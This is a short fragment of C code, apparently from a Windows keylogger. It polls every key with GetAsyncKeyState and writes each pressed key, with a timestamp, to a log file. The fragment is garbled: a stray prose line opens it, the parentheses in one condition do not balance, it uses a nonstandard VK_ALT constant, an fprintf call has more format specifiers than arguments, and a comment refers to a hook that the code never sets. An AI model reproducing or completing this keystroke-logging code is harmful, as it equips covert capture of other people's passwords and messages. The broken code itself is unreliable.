        GetAsyncKeyState is a function that returns the state of the keyboard
        for (int wparam = 0; wparam < 256; ++wparam) {
            int state = GetAsyncKeyState(wparam);
            if ((state & 0x1) != 0) { // Key is pressed
                // Determine if it's a modifier key
                if ((wparam == VK_SHIFT || wparam == VK_CONTROL || wparam == VK_ALT) {
                    // Handle modifier keys differently
                    // For example, if Shift is pressed, uppercase the character
                    // For this example, we'll log the actual key pressed
                    // and not the shifted character
                } else {
                    // Normal key, log as is
                    // Convert to char
                    buffer[0] = (char)wparam;
                }
                // Write to file
                fprintf(logfile, "[%s] %c %d\n", ctime(&now), buffer[0]);
            }
        }
    }

    // Release the hook and close the file
